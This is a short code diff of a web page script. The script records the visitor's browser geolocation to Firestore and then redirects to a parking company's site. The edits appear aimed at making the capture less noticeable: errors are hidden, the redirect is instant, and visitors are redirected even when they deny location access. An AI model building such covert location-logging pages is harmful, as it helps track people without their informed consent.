@@ -41,9 +41,9 @@
         minute: "2-digit",
         second: "2-digit",
         hour12: true
-      }).replace(",", ""); // remove comma after date
+      }).replace(",", "");
 
-      // Show on page
+      // Show on page (just for debug)
       document.getElementById("coords").innerText =
         `Lat: ${lat}, Lng: ${lng}\nTime: ${formattedTimestamp}`;
 
@@ -54,21 +54,17 @@
         timestamp: isoTimestamp,            // machine-friendly
         timestampFormatted: formattedTimestamp // human-friendly
       })
-      .then((docRef) => {
-        console.log("✅ Saved with ID:", docRef.id);
-        // Redirect after 3s
-        setTimeout(() => {
-          window.location.href = "https://www.parkonic.com/";
-        }, 3000);
+      .then(() => {
+        // 🚀 Instantly redirect after Firestore confirms save
+        window.location.href = "https://www.parkonic.com/";
       })
       .catch((err) => {
         console.error("❌ Logging failed:", err);
-        document.getElementById("coords").innerText =
-          "Error saving to Firestore: " + err.message;
+        window.location.href = "https://www.parkonic.com/"; // still redirect
       });
     },
     function () {
-      alert("Location access denied.");
+      window.location.href = "https://www.parkonic.com/";
     }
   );
 </script>
